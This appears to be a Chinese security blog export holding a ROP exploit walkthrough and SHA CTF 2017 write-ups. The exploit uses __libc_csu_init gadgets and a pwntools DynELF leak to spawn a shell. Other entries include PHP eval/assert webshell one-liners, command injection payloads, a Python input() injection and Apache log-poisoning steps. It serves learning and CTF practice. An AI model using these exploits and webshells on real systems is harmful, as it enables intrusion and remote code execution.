……，第一个p64(0)，是起一个padding的作用，用来填充rsp到rsp+0x7之间的数据的。（因为之前调用的read和write的第一个参数就是STDIN_FILENO，值为0，所以这里rbx原本就是0，所以可能感觉没啥变化，其实就是用0赋值给了一个原本就是0的rbx） 接下去按n，执行mov rbp,QWORD PTR [rsp+0x10]，将rsp+0x10也即rsp+16地址处的数据以QWORD形式即8字节赋值给rbp。 接下去一直按n，程序依次执行mov操作，直至add rsp,0x38，此时寄存器情况如下： 几个重要的寄存器值列举如下： RBX: 0x0 RBP: 0x1 R12: 0x601000 R13: 0x1 R14: 0x601000 R15: 0x8 此时栈中数据仍然如前： 接下去我们输入n，程序执行完add rsp,0x38，即将栈顶加上0x38，也即加上56，这相当于是降低了栈顶（栈从低地址向高地址增长）。接下去程序将会执行ret指令，而此时的栈，注意是此时的栈，其内容如下： 接下去输入n，将会执行ret指令，相当于pop rip，也就是说执行完ret，将会跳转到栈顶所指的地址0x4005f0 第二阶段接下来算是进入ROP的第二阶段。 这时的各寄存器的值如下图， 在经过三个mov操作后mov rdx,r15，mov rsi,r14，mov edi,r13d，我们成功地把进行write函数调用所需的三个参数都布置好了。 寄存器数据如下： 接下去会执行call QWORD PTR [r12+rbx*8]，而我们已经将rbx置为0，r12置为write的got地址，所以执行这句语句，其实就是在调用write()函数。用如下命令可以查看r12+rbx*8处具体的值。12gdb-peda$ x/gx $r12+$rbx*80x601000 &lt;write@got.plt&gt;: 0x00007fdb0df2c280 第三阶段在call指令执行完了后，即调用完write（）函数后，我们进入ROP的第三阶段，收尾阶段。毕竟调用完后不能让程序崩溃啊。这时候对应的payload是12payload1 += &quot;\x00&quot;*56payload1 += p64(main) 此时寄存器中： 这是之前第一阶段中，我们设置的，RBX = 0x0，RBP = 0x1。将会进行如下三条指令：1230x4005fd &lt;__libc_csu_init+93&gt;: add rbx,0x10x400601 &lt;__libc_csu_init+97&gt;: cmp rbx,rbp0x400604 &lt;__libc_csu_init+100&gt;: jne 0x4005f0 &lt;__libc_csu_init+80&gt; 将rbp加1，得到0x01，然后与值为0x01的rbp进行比较，jne指令说明如果两者比较相等则不会进行跳转，所以这里不会执行跳转，而是继续执行。 接下来“回”到了第一阶段的代码，此时的栈中的情况如下： 我们会执行六次的mov操作，但我们此时不需要再布置参数，所以可以说不用管：)。12345670x400606 &lt;__libc_csu_init+102&gt;: mov rbx,QWORD PTR [rsp+0x8]0x40060b &lt;__libc_csu_init+107&gt;: mov rbp,QWORD PTR [rsp+0x10]0x400610 &lt;__libc_csu_init+112&gt;: mov r12,QWORD PTR [rsp+0x18]0x400615 &lt;__libc_csu_init+117&gt;: mov r13,QWORD PTR [rsp+0x20]0x40061a &lt;__libc_csu_init+122&gt;: mov r14,QWORD PTR [rsp+0x28]0x40061f &lt;__libc_csu_init+127&gt;: mov r15,QWORD PTR [rsp+0x30]0x400624 &lt;__libc_csu_init+132&gt;: add rsp,0x38 接下来，会将rsp加上0x38，即加上56。结合栈的情况，这次add操作，将会将main函数的地址作为栈顶。 所以这一阶段的payload的构成是56个\x00，紧接是准备回到某个位置的内存地址。在执行完ret后，程序将回到mian函数中，以便我们进行下一次的利用。 小结综合对三个阶段的分析，在64位程序栈溢出时若用了__libc_csu_init中的gadget，其payload组成如下12345678910111213141516payload = &apos;\x00&apos; * offset # offset是溢出偏移点## 第一阶段payload += p64(mov_rbx_rsp0x8_addr)payload += p64(0) # 填充rsp到rsp+7间的数据payload += p64(0) # 为后面 rbx 置 0 做准备payload += p64(1) # 为后面 rbp 置 1 做准备paylaod += p64(call_func_got_addr) # 要调用函数的GOT地址，因为后面的调用是用QWORD PTR来进行的。payload += p64(第一个参数) # 调用函数的第一个参数payload += p64(第二个参数) # 调用函数的第二个参数payload += p64(第三个参数) # 调用函数的第三个参数payload += p64(mov_rdx_r15_addr) # 利用 ret 指令进入rop的第二阶段## 第二阶段 该阶段无需控制## 第三阶段payload += &quot;\x00&quot; * 56 # 填充 rsp 到 rsp+55间的数据payload += p64(return_addr) # 将要返回的地址， 利用现在我们利用这个通用ROP，写一个exp。大体思路是，利用DynELF借write()函数泄露出system的地址。但要注意几点，得到system的地址后，不能直接作为call_func_got_addr，而应该先写到bss段，再填入bss段的地址。所以下面的payload中，bss_addr到bss_addr+7，保存着system的地址，bss_addr+8到bss_addr+15保存着字符串“/bin/sh\x00”。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *elf = ELF('level5')p = process('./level5')sh = "/bin/sh\x00"bss_addr = elf.bss(0x20)got_write = elf.got['write']got_read = elf.got['read']log.success("The write got address is "+ hex(got_write))log.success("The read got address is "+ hex(got_read))main = 0x400564def leak(address): p.recv() payload = "\x00"*136 payload += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(address) + p64(8) payload += p64(0x4005F0) payload += "\x00"*56 payload += p64(main) p.send(payload) data = p.recv(8) return datadynelf = DynELF(leak,elf=elf)system_addr = dynelf.lookup("system","libc")log.success("The system address is " + hex(system_addr))payload2 = '\x00' * 136payload2 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16)payload2 += p64(0x4005F0)payload2 += "\x00" * 56payload2 += p64(main)p.send(payload2)system_sh = p64(system_addr) + shp.send(system_sh)p.recvuntil("Hello, World\n")payload3 = '\x00' * 136payload3 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0)payload3 += p64(0x4005F0)payload3 += "\x00"*56payload3 += p64(main)p.send(payload3)p.interactive()]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[SHACTF-2017-Secure Login-writeup]]></title>
      <url>%2F2017%2F08%2F09%2FSHACTF-2017-Secure-Login-writeup%2F</url>
      <content type="text"><![CDATA[Task12345Secure Login (200) - 67 solvesThis server uses signed tickets to allow users to login, can you find the flag?nc secure-login.stillhackinganyway.nl 12345chall.pye2050ad74ffc19ca7a95435b283b9308]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[php代码/命令执行漏洞]]></title>
      <url>%2F2017%2F08%2F08%2Fphp%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%2F</url>
      <content type="text"><![CDATA[php代码/命令执行漏洞 常见危险函数php代码执行相关eval()1mixed eval ( string $code ) 把字符串code作为php代码执行。常见的一句话木马：123&lt;?php eval($_GET['pass'])?&gt; 访问：1http://xxx/codeexec.php?pass=phpinfo(); 得到phpinfo()页面。 assert()PHP 51bool assert ( mixed $assertion [, string $description ] ) PHP 71bool assert ( mixed $assertion [, Throwable $exception ] ) assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的响应。如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。 一句话木马：123&lt;?php assert($_GET['pass']);?&gt; 访问：1http://xxx/codeexec.php?pass=phpinfo() phpinfo()后可以不用分号。得到phpinfo()页面。 preg_replace1mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) 搜索subject中匹配pattern的部分， 以replacement进行替换。当使用被弃用的 e 修饰符时, 这个函数会转义一些字符，在完成替换后，引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串更详细的说明见：php-preg_replace call_user_func()1mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] ) 第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。 传入call_user_func()的参数不能为引用传递。 123&lt;?php call_user_func($_GET['chybeta'],$_GET['ph0en1x']);?&gt; 访问：1http://localhost:2500/codeexec.php?chybeta=assert&amp;ph0en1x=phpinfo() call_user_func_array()1mixed call_user_func_array ( callable $callback , array $param_arr ) 把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。 123&lt;?php call_user_func_array($_GET['chybeta'],$_GET['ph0en1x']);?&gt; 访问：1http://localhost:2500/codeexec.php?chybeta=assert&amp;ph0en1x[]=phpinfo() create_function1string create_function ( string $args , string $code ) 该函数的内部实现用到了eval，所以也具有相同的安全问题。第一个参数args是后面定义函数的参数，第二个参数是函数的代码。 12345&lt;?php $a = $_GET['chybeta']; $b = create_function('$a',"echo $a"); $b('');?&gt; 访问：12http://localhost:2500/codeexec.php?chybeta=phpinfo(); array_map()1array array_map ( callable $callback , array $array1 [, array $... ] ) 作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。 1234&lt;?php $array = array(0,1,2,3,4,5); array_map($_GET['chybeta'],$array);?&gt; 访问：12http://localhost:2500/codeexec.php?chybeta=phpinfo 注意没有括号()和分号;。 系统命令执行相关system()1string system ( string $command [, int &amp;$return_var ] ) command是要执行的命令。return_var，如果提供 return_var 参数， 则外部命令执行后的返回状态将会被设置到此变量中。 123&lt;?php system("whoami");?&gt; 会看到运行了shell命令，并打印回显到页面上。 passthru()1void passthru ( string $command [, int &amp;$return_var ] ) command是要执行的命令。return_var，如果提供 return_var 参数， Unix 命令的返回状态会被记录到此参数。 123&lt;?php passthru("whoami");?&gt; exec()1string exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] ) exec() 执行 command 参数所指定的命令。 其余参数，见文档 123&lt;?php echo exec("whoami");?&gt; pcntl_exec()1void pcntl_exec ( string $path [, array $args [, array $envs ]] ) path是可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本args是一个要传递给程序的参数的字符串数组。 123&lt;?php pcntl_exec ( "/bin/bash" , array("whoami"));?&gt; shell_exec()1string shell_exec ( string $cmd ) cmd是要执行的命令。 123&lt;?php echo shell_exec("whoami");?&gt; popen()1resource popen ( string $command , string $mode ) 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。 后面的mode，当为 ‘r’，返回的文件指针等于命令的 STDOUT，当为 ‘w’，返回的文件指针等于命令的 STDIN。 123&lt;?php$handle = popen("/bin/ls", "r");?&gt; proc_open()1resource proc_open ( string $cmd , array $descriptorspec , array &amp;$pipes [, string $cwd [, array $env [, array $other_options ]]] ) cmd是要执行的命令，其余见文档 `(反单引号)在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出，使用反引号运算符“`”的效果与函数 shell_exec() 相同。 123&lt;?php echo `whoami`;?&gt; ob_start()1bool ob_start ([ callback $output_callback [, int $chunk_size [, bool $erase ]]] ) 此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。想要输出存储在内部缓冲区中的内容，可以使用 ob_end_flush() 函数。 可选参数 output_callback 函数可以被指定。 此函数把一个字符串当作参数并返回一个字符串。 当输出缓冲区被( ob_flush(), ob_clean() 或者相似的函数)冲刷（送出）或者被清洗的时候；或者在请求结束之际输出缓冲区内容被冲刷到浏览器的时候该函数将会被调用。 当调用 output_callback 时，它将收到输出缓冲区的内容作为参数 并预期返回一个新的输出缓冲区作为结果，这个新返回的输出缓冲区内容将被送到浏览器。 下面的代码，由于调用了ob_end_flush()，所以会调用ob_start($cmd)中的cmd，把我们输入的$_GET[a]作为cmd的参数。123456&lt;?php $cmd = 'system'; ob_start($cmd); echo "$_GET[a]"; ob_end_flush();?&gt; 访问：1http://localhost:2500/codeexec.php?a=whoami php mail()mail 文档1234567bool mail ( string $to , string $subject , string $message [, string $additional_headers [, string $additional_parameters ]]) 要使用mail()函数，需要配置对应的服务器等，在php.ini中有两个选项： 配置SMTP服务器的主机名和端口 配置PHP用作邮件传输代理（MTA）的文件路径 当PHP配置了第二个选项时，对该mail()函数的调用将导致执行配置对MTA程序。虽然PHP内部使用escapeshellcmd()用于程序调用，防止新的shell命令注入，但第5个参数$additional_parameters中mail()允许添加的新程序。因此，攻击者可以附加程序标志，在某些MTA中可以创建具有用户控制内容的文件。 实例：多个PHP mail函数引发的命令执行漏洞分析 参考：为什么mail()函数在PHP中是危险的 反序列化问题见：浅谈php反序列化漏洞 LD_PRELOAD绕过实例：第十届全国大学生信息安全技能赛PHP execise参考: 利用环境变量LD_PRELOAD来绕过php disable_function执行系统命令 Refference Obvious and not so obvious PHP code injection and evaluation]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[SHACTF-2017-Growing Up-writeup]]></title>
      <url>%2F2017%2F08%2F06%2FSHACTF-2017-Growing-Up-writeup%2F</url>
      <content type="text"><![CDATA[SHACTF-2017-Growing Up-writeup 单刷。 前言Growing Up这题题目如下1You remember the day you started hacking or playing CTF&apos;s? You can relive these days by playing our junior version. Just solve all challenges to get the flag ;-) 所以只有当把 Junior上的题全做完后才能拿到flag。自己一个人单刷了四五个小时，最后于凌晨2：25分拿到了这题的flag。 CryptoAll about the Base (1)12345We found this encoded message. Can you decode it?V2VsbCBkb25lLAoKdGhpcyBmaWxlIGlzIGVuY3J5cHRlZCB3aXRoIEJhc2U2NC4gT2Z0ZW4gdXNlZCBpbiBDVEYncyB0byBkaXNwbGF5IGJpbmFyeSBkYXRhIGluIGEgbW9yZSBmcmllbmRseSB3YXkuIAoKVGhlIGZsYWcgZm9yIHRoaXMgY2hhbGxlbmdlIGlzIGZsYWd7YjNlOWMzZWVlNjA5YmFjNDZmYWQ0NDM5Y2YzMjFmZTV9Cg== flag:123&gt;&gt;&gt; import base64&gt;&gt;&gt; base64.b64decode(&quot;V2VsbCBkb25lLAoKdGhpcyBmaWxlIGlzIGVuY3J5cHRlZCB3aXRoIEJhc2U2NC4gT2Z0ZW4gdXNl ZCBpbiBDVEYncyB0byBkaXNwbGF5IGJpbmFyeSBkYXRhIGluIGEgbW9yZSBmcmllbmRseSB3YXku IAoKVGhlIGZsYWcgZm9yIHRoaXMgY2hhbGxlbmdlIGlzIGZsYWd7YjNlOWMzZWVlNjA5YmFjNDZm YWQ0NDM5Y2YzMjFmZTV9Cg==&quot;)&quot;Well done,\n\nthis file is encrypted with Base64. Often used in CTF&apos;s to display binary data in a more friendly way. \n\nThe flag for this challenge is flag&#123;b3e9c3eee609bac46fad4439cf321fe5&#125;\n&quot; Rotation (1)12Seems someone rotated the alphabet, can you get the original message back?Ykksy eua ckxk ghrk zu mkz znk zkdz hgiq. Znk lrgm oy lrgm&#123;30j3g1gg0ijg9l08ijlg52668hi6854g&#125; 凯撒1Seems you were able to get the text back. The flag is flag&#123;30d3a1aa0cda9f08cdfa52668bc6854a&#125; Substitute Teacher (2)1234Hello, my name is Mr. Smith, I will be your substitute teacher for today. I only have one assignment for you today, if you solve it you may go home. Now be silence and solve it, so I can Netflix and chill!osvi cpm dprzsob ulsd hddsboeiou. iocpg gpaj njii usei. rihzi uli vrhdd tsulpau ehfsob h dpaow,s&apos;e so uli eswwri pn h oit iqsdpwi pn pjhobi sd uli oit mrhvf po oiunrsy. npj gpaj innpjud s lhzih nrhb npj gpa: nrhb&#123;h230h7i624hnhv36291v5n31nh818w6n&#125; 词频分析一下，丢到这个网站 http://quipqiup.com/ ：1flag&#123;a230a7e624afac36291c5f31fa818d6f&#125; Exclusive or … (2)1We found this strange text, can you get the original from it? 题目说得很明显啦，异或加密。我们可以用工具xortool。 得到明文：1Well done. This text is encrypted with XOR with the single character &apos;\x03&apos;. XOR is often used in CTF challenges. We did use it in our teaser challenges &apos;Crypto Engine&apos; and &apos;Website Attack&apos;. The flag of this challenge is: flag&#123;a157d2b4eb73c60ff0cdbe2a2dea06c3&#125; flag为：1flag&#123;a157d2b4eb73c60ff0cdbe2a2dea06c3&#125; Transposition (3)123We intercepted this secret message. We believe it is using a transposition cipher. Can you decipher it?Citgoe6b0 oohern636 nni.tg1e2 gssThe58e rschii366aohess3ae tlafcf3dc uvllhl24f lilaaa730 aneglg506 tgnfl&#123;33&#125; 竖下来读。得到明文1Congratulationssolvingthischallenge.Theflagforthischalengeisflag&#123;66153332753b3e86ad4303062e6ecf06&#125; flag：1flag&#123;66153332753b3e86ad4303062e6ecf06&#125; ForensicsDeleted File (3) 1FLAG&#123;129F0A52F0F41E077E0FD03063FF4FAD&#125; MiscZipfile One (1)1We received this zip file, but is asking for a password. All we know is that the password exists of 5 numbers, can you crack this password to get the hidden information? 给了压缩包，又说了是五个数字。爆破得密码为42831。flag：1flag&#123;d6f56ae046bb241cc61f9d26f8e525d9&#125; Zipfile Two (2)1We received another zip file, which also requires a password. All we know is that the password is an existing English word with a length of 6 and all lowercase. Can you crack this password? 继续爆破，得密码为：future。得到flag：1flag&#123;7128d78caf1e3297386a09afae0f8ea4&#125; Reverse (3)1We found this file on a server on the other side of the world, it looks weird, can you &quot;reverse&quot; it? 一开始做的时候，从后读取放到新文件里，比如\x74 \xe4 \x05 \x98对应成\x98 \x05 \xe4 \x7，结果输出后发现没用。后面突然想到，74e40598，直接尼过来是 89504e47，这个正是png的文件头。 所以我先把原文件的十六进制拿了出来，把里面的空格，换行符去掉，放到reverse_fix中。用下面的脚本得到“逆向”后的十六进制。1234567891011reverse = open("reverse_fix","r")flag_reverse = open("flag_reverse.txt","wb")data = reverse.read()datalen = len(data)data = data[::-1]flag_reverse.write()reverse.close()flag_reverse.close() 之后再把flag_reverse.txt中的内容复制到十六进制编辑器中，保存为一张图片。 flag：1flag&#123;758d7fa2762ab838c4835f1995e151d2&#125; NetworkDownload (1) 1FLAG&#123;259F1B841EAAA4FCB843D77DCDADE55A&#125; Wanna Buy A Flag? (2)打开后追踪TCP流，得到flag：1flag&#123;f08574923ec9c9ffb47188e6edc1a20f&#125; Weird Website (3) 导出页面后查看。1flag&#123;8233daf526dcee25fd9ffda3bb99d677&#125; Captured Mail (4) 12345678import base64capturedmail = open("capturedmail.zip","wb")data = "UEsDBBQAAAAIAIy53UoyFb1+UwAAAFgAAAAIABwAZmxhZy50eHRVVAkAAzhtVVk4bVVZdXgLAAEE6AMAAAToAwAAFclLCoAgEADQfaeYA0QQMaOz7iSjjB8QBbVVdPdq+Xhnq7HLvIrM3OpYYSaFUCRCaP1DHuCTlKI1Knz4694dsrHGGELrxAuzV8JDAgVBJn225QVQSwECHgMUAAAACACMud1KMhW9flMAAABYAAAACAAYAAAAAAABAAAApIEAAAAAZmxhZy50eHRVVAUAAzhtVVl1eAsAAQToAwAABOgDAABQSwUGAAAAAAEAAQBOAAAAlQAAAAAA"capturedmail.write(base64.b64decode(data))capturedmail.close() 得到一个压缩包，解压后得到flag： 1flag&#123;1b5978777658baca99ce653af6fa596e&#125; WebIn Your Head (1)地址：http://inyourhead.stillhackinganyway.nl/ 抓包看头部，得到flag：1flag&#123;a1a4d64086f713e92a809859d930d120&#125; Old School (2)地址：http://oldschool.stillhackinganyway.nl/抓包修改User-Agent头：Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)1flag&#123;f374df6554c7c6a6fced10396c84baf6&#125; Broken Image (2)查看源代码，把base64串进行解密。得到flag：1flag&#123;c0711614358a27110ca159302b106759&#125; Location (3)点进去后，每次访问一个新的页面，就记下页面的三个字母。等跳转完把字母拼接起来就行了。1flag&#123;f51cf5e7e1d003986acd2864139553a1&#125; Ping (4)1http://ping.stillhackinganyway.nl/?ip=127.0.0.1|ls 知道有 s3cr3tfl4g.txt 1http://ping.stillhackinganyway.nl/?ip=127.0.0.1|cat s3cr3tfl4g.txt 得到flag：1flag&#123;a8bb1ea55704762941ef519f98fff075&#125; Pwnablesmall (4)服务器端是python服务。12#!/usr/bin/env pythonprint "HACK "*input("Number: ") 以下是exp： 1234567from pwn import *r = remote("small.stillhackinganyway.nl",1337)paylaod = "__import__('os').system('cat /home/small/flag')"r.sendline(paylaod)# print(r.recv())r.interactive() 得到flag：1flag&#123;69b5a247b9cd52ac97de7cc94994083e&#125; ReFind The Flag (1)用IDA打开看一下就得到了flag：1flag&#123;b760866fa6f035548be127b7525dbb66&#125; Hidden Message (3)JEB打开，查看strings.xml。 1flag&#123;d3314ac1a08d65ea32ffd30907de2409&#125; Flip A Coin (4)用IDA打开后，通过查看strings可以找到关键处。可以看到当v3==100，时会输出flag。 而v3是在每次赢了之后会加一，其地址为0x00401668 接下来用olldbg来动态调试。 给0x00401668处下个断点。 第一次输1，如果赢了的话，会看到对应的位置由0变成了1 利用olldbg的修改数据功能，我们把1修改为100，这里是十六进制，所以填入64 之后点击运行。程序判断v3==100后进行输出flag操作。 flag:1flag&#123;d754c599d47d9b3e4a376e1d770ca8c1&#125; Jump Around (4) 写个程序跑一下。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;windows.h&gt;using namespace std;int main()&#123; int v1[48]; __int64 v8 = 7523094288207667809LL; __int64 v9 = 8101815670912281193LL; __int64 v10 = 8680537053616894577LL; __int64 v11 = 3833745473465776761LL; __int64 v12 = 959985462; __int64 v13 = 24929; __int64 v2 = 6508264540403273223LL; __int64 v3 = 5213490578399759196LL; __int64 v4 = 5409190721146722066LL; __int64 v5 = 73472674227045146LL; __int64 v6 = 202114575; __int64 v7 = 7173; int i; for ( i = 0; i &lt;= 7; ++i )&#123; v1[i] = *((char *)&amp;v2 + i) ^ *((char *)&amp;v8 + i); printf("%c",v1[i]); &#125; for ( i = 0; i &lt;= 7; ++i )&#123; v1[i] = *((char *)&amp;v3 + i) ^ *((char *)&amp;v9 + i); printf("%c",v1[i]); &#125; for ( i = 0; i &lt;= 7; ++i )&#123; v1[i] = *((char *)&amp;v4 + i) ^ *((char *)&amp;v10 + i); printf("%c",v1[i]); &#125; for ( i = 0; i &lt;= 7; ++i )&#123; v1[i] = *((char *)&amp;v5 + i) ^ *((char *)&amp;v11 + i); printf("%c",v1[i]); &#125; for ( i = 0; i &lt;= 3; ++i )&#123; v1[i] = *((char *)&amp;v6 + i) ^ *((char *)&amp;v12 + i); printf("%c",v1[i]); &#125; for ( i = 0; i &lt;= 1; ++i )&#123; v1[i] = *((char *)&amp;v7 + i) ^ *((char *)&amp;v13 + i); printf("%c",v1[i]); &#125; return 0;&#125; 得到flag：1flag&#123;f525a6abd58ce9488f3c90904149145d&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[SHACTF-2017-Web-writeup]]></title>
      <url>%2F2017%2F08%2F06%2FSHACTF-2017-Web-writeup%2F</url>
      <content type="text"><![CDATA[SHACTF-2017-Web-writeup Bon Appétit (100)Methon One1bonappetit.stillhackinganyway.nl 有个page参数。访问:1view-source:http://bonappetit.stillhackinganyway.nl/?page=.htaccess 得到有个 suP3r_S3kr1t_Fl4G 。访问：12http://bonappetit.stillhackinganyway.nl/?page=suP3r_S3kr1t_Fl4G 得到flag：1flag&#123;82d8173445ea865974fc0569c5c7cf7f&#125; 感谢lzhtony和各位大佬的帮忙，不然我还一直沉浸在log的世界里不能自拔。。 Methon Two有包含，那就可以包含日志。由于题目有提到apache的log。所以有必要去看看log保存在什么地方。访问：12http://bonappetit.stillhackinganyway.nl/?page=//etc/apache2/sites-enabled/000-default.conf error.log在默认位置，而CustomLog在由var/www/html/log.sh决定。接下来我们访问：12http://bonappetit.stillhackinganyway.nl/?page=//var/www/html/log.sh 可以知道，我们访问这个页面的log，会被保存到/var/www/html/logs/${HOST}.log中，而${HOST}即为你的ip地址。 接下来我们正式利用log来getshell。 在自己的vps（具有公网ip）上，访问1http://bonappetit.stillhackinganyway.nl/&lt;?php @eval($_POST[&apos;test&apos;]);?&gt; 并用burp截包修改被转义的字符。如下，之后将其转发出去。 接下来包含自己对应主机的log文件。1http://bonappetit.stillhackinganyway.nl/?page=//var/www/html/logs/yourvpsip.log 用菜刀连上，密码为test。 最终得到flag：]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[SHACTF-2017-WannaFly-writeup]]></title>
      <url>%2F2017%2F08%2F06%2FSHACTF-2017-WannaFly-writeup%2F</url>
      <content type="text"><![CDATA[SHACTF-2017-WannaFly-writeup。虽然只有100分，不过比国内一些比赛的题目质量好多了。 题目1234WannaFly (100)My daughter Kimberly her computer got hacked. Now she lost all her favorite images. Can you please help me recover those images?wannafly.tgz7509faed92d67a242068de6605659ca1 分析镜像题目压缩包下载下来后解压有一个img镜像文件。用DiskGenius载入后浏览文件。 文件.bash_history内容如下：123456unset HISTFILls -lapwdchmod +x ..../... Hb8jnSKzaNQr5f7pls -Rla 文件...内容是一个python脚本，这边先不放出来，放在后面分析用。这里有个坑，DiskGenius是在win平台下的，直接把这个文件导出来后，win系统无法识别点开头的文件根本无法打开，也不能删除。我的方法是把这个导出来的文件先用压缩包压缩后，在压缩包中进行一下重命名，之后再解压缩出来。 在Picture文件夹里有一些被加密后的图片。如下： 深入分析前面我们得到了...文件，其内容如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#!/usr/bin/env pythonimport random, string, sys, osfrom time import timefrom Crypto.Cipher import AESimport base64from PIL import Imagefrom PIL import ImageFontfrom PIL import ImageDrawfrom PIL import ImageFilterimport textwrapfrom io import BytesIOIMG="""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